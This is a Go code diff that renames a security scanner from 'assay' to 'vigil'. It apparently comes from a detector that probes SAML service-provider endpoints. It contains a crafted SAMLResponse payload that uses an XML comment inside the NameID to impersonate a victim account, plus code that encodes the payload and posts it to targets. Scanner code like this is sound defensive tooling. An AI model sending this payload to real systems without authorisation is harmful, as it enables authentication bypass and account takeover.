@@ -26,8 +26,8 @@ import (
 	"net/url"
 	"strings"
 
-	"github.com/TyrusRC/assay/internal/core"
-	assayhttp "github.com/TyrusRC/assay/internal/http"
+	"github.com/TyrusRC/vigil/internal/core"
+	vigilhttp "github.com/TyrusRC/vigil/internal/http"
 )
 
 // candidatePaths covers the SP-side endpoints SAML deployments expose.
@@ -63,17 +63,17 @@ const commentPayload = `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0
   IssueInstant="2024-01-01T00:00:00Z" Destination="REPLACE_DEST" ID="r1">
   <saml:Issuer>https://idp.example/</saml:Issuer>
   <saml:Assertion ID="a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
-    <saml:Subject><saml:NameID>victim@example.com<!--assay-comment-->@evil.example</saml:NameID></saml:Subject>
+    <saml:Subject><saml:NameID>victim@example.com<!--vigil-comment-->@evil.example</saml:NameID></saml:Subject>
   </saml:Assertion>
 </samlp:Response>`
 
 // Detector probes for SAML-injection-friendly endpoints.
 type Detector struct {
-	client *assayhttp.Client
+	client *vigilhttp.Client
 }
 
 // New returns a Detector wired to the project's shared HTTP client.
-func New(client *assayhttp.Client) *Detector {
+func New(client *vigilhttp.Client) *Detector {
 	return &Detector{client: client}
 }
 
@@ -130,7 +130,7 @@ func (d *Detector) probe(ctx context.Context, target, payload string) (bool, cor
 	body := payload
 	body = strings.ReplaceAll(body, "REPLACE_DEST", target)
 	encoded := base64.StdEncoding.EncodeToString([]byte(body))
-	form := "SAMLResponse=" + url.QueryEscape(encoded) + "&RelayState=assay"
+	form := "SAMLResponse=" + url.QueryEscape(encoded) + "&RelayState=vigil"
 	noRedirect := d.client.Clone().WithFollowRedirects(false)
 	resp, err := noRedirect.SendRawBody(ctx, target, "POST", form, "application/x-www-form-urlencoded")
 	if err != nil || resp == nil {
